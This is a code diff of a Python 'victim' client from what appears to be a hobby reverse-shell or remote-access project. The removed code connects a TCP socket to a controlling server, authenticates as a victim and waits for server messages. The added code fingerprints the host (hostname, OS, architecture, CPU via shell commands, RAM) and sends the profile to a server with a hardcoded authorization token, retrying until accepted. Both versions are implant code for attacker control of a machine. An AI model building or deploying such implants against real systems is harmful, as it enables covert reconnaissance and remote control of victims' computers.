@@ -1,73 +1,65 @@
-import socket
-import reverse_shell.consts as ct
-import reverse_shell.utils as ut
+import subprocess
+import uuid
 import platform
-import time
+import os
+import re
+import psutil
 import json
-from sys import exit
+from time import sleep
+from http.client import HTTPConnection
+from http import HTTPStatus
 
 
-def initiate():
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    addr = ('localhost', ct.SERVER_PORT)
-    sock.connect(addr)
-    return sock
+class Victim:
+    def __init__(self, auth_token: str, server_address: str, port_number: int = 80):
+        # Establish a connection with the server
+        self.connection = HTTPConnection(server_address, port_number)
+        self.id = uuid.getnode()
+        self.client_type = "victim"
+        self.default_header = {"Client-Id": self.id, "Client-Type": self.client_type, "Authorization": f"Basic {auth_token}"}
+
+    @staticmethod
+    def get_processor_name():
+        if platform.system() == "Windows":
+            return platform.processor()
+        elif platform.system() == "Darwin":
+            os.environ['PATH'] = os.environ['PATH'] + os.pathsep + '/usr/sbin'
+            command = ["sysctl", "-n", "machdep.cpu.brand_string"]
+            return subprocess.check_output(command).strip().decode("utf-8")
+        elif platform.system() == "Linux":
+            command = "cat /proc/cpuinfo"
+            all_info = subprocess.check_output(command, shell=True).decode().strip()
+            for line in all_info.split("\n"):
+                if "model name" in line:
+                    return re.sub(".*model name.*:", "", line, 1)
+        return ""
+
+    def send_computer_info(self):
+        """Send victims computer information to the server."""
+        # Obtain necessary computer information
+        computer_information = {
+            "host_name": platform.uname().node,
+            "os": platform.platform(),
+            "arch": platform.machine(),
+            "cpu": self.get_processor_name(),
+            "ram": f"{round(psutil.virtual_memory().total / (1024.0 ** 3))}GB"
+        }
+        # Create a POST request infinitely until the server sends back
+        # the 201 status code
+        status_code = None
+        while status_code != HTTPStatus.CREATED and status_code != HTTPStatus.OK:
+            # We first need to reformat the data to include the victim_id
+            # encoded_computer_specs = json.dumps(computer_information)
+            data = json.dumps(computer_information)
+            self.connection.request("PUT", "/victim_computer_specs", body=data, headers={**self.default_header, "Content-type": "application/json", "Content-Length": str(len(data.encode("utf-8")))})
+
+            response = self.connection.getresponse()
+            status_code = response.status
+            print(f"{response.status} {response.reason}")
+            sleep(2)
+
+        print("Computer info has been successfully sent to the server")
 
 
-def send_computer_info(sock):
-    my_system = platform.uname()
-    os = my_system.system
-    arch = my_system.machine
-    computer_info = json.dumps({"os": os.lower(), "arch": arch.lower(), "name": my_system.node.lower()})  # Sterilize the computer info
-    ut.send_message(computer_info, sock)
-
-
-def send_verification(sock):
-    ut.send_message("victim", sock)
-    verification_message = ut.receive_message(sock)
-
-    if verification_message == ct.UNVERIFIED_MESSAGE:
-        ut.log("error", "Verification failed! exiting...")
-        exit(1)
-
-    else:
-        ut.log("success", "Verification Succeeded!")
-
-
-def connect_whatever():
-    while True:
-        try:
-            sock = initiate()
-            return sock
-        except IOError:
-            print("IOerror occurred restarting after 5s...")
-            time.sleep(5)
-
-
-def start():
-    sock = connect_whatever()
-    # Verifying the client
-    send_verification(sock)
-
-    # Sending computer information
-    send_computer_info(sock)
-
-    connected = True
-
-    while connected:
-        message = ut.receive_message(sock)
-
-        if not message:
-            connected = False
-            continue
-
-        if message == ct.DISCONNECT_MESSAGE:
-            connected = False
-
-        ut.log("message accepted", f"Server -> {message}")
-
-    ut.log("disconnected", "Disconnected with the server.")
-
-
-if __name__ == "__main__":
-    start()
+victim = Victim("NDM0Y2FkMGQtMjI5Yi00NGU4LTg2ZGItZDRjNGI4MWY4N2Zi", "localhost")
+victim.send_computer_info()
